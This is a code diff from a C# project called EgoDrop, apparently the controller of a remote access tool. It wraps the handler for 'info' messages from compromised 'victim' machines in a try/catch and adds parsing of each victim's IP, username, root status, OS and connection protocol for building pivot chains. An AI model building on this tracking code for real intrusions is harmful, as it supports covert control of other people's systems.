@@ -191,18 +191,27 @@ namespace EgoDrop
                                         }
                                     }
 
-                                    string szSrcVictimID = lsVictim.Last();
-                                    fnOnReceivedMessage(victim, szSrcVictimID, lsMsg);
-
-                                    if (lsMsg[0] == "info")
+                                    try
                                     {
-                                        szVictimID = szSrcVictimID;
-                                        string szIPv4 = lsMsg[3];
-                                        string szUsername = lsMsg[5];
-                                        bool bRoot = string.Equals(lsMsg[7], "1");
-                                        string szOS = lsMsg[8];
+                                        string szSrcVictimID = lsVictim.Last();
+                                        fnOnReceivedMessage(victim, szSrcVictimID, lsMsg);
 
-                                        fnOnAddChain(lsVictim, szOS, szUsername, bRoot,szIPv4);
+                                        if (lsMsg[0] == "info")
+                                        {
+                                            szVictimID = szSrcVictimID;
+                                            string szIPv4 = lsMsg[3];
+                                            string szUsername = lsMsg[5];
+                                            bool bRoot = string.Equals(lsMsg[7], "1");
+                                            string szOS = lsMsg[8];
+
+                                            var enProtocol = (NetworkView.enConnectionType)Enum.Parse(typeof(NetworkView.enConnectionType), lsMsg.Last());
+
+                                            fnOnAddChain(this, victim, lsVictim, szOS, szUsername, bRoot, szIPv4, enProtocol);
+                                        }
+                                    }
+                                    catch (InvalidOperationException)
+                                    {
+
                                     }
                                 }
                             }
